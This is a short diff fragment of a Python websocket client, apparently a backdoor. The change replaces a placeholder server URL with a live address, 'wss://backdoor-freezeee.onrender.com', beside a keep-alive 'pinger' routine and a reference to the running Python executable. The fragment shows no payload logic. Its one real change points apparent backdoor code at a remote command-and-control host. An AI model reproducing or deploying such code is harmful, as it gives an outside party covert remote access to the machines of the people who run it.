@@ -5,7 +5,7 @@ import websockets  # type: ignore
 
 current_exe = sys.executable
 
-server_url = "YOUR_SERVER_URL"
+server_url = "wss://backdoor-freezeee.onrender.com"
 
 async def pinger(ws):
     try:
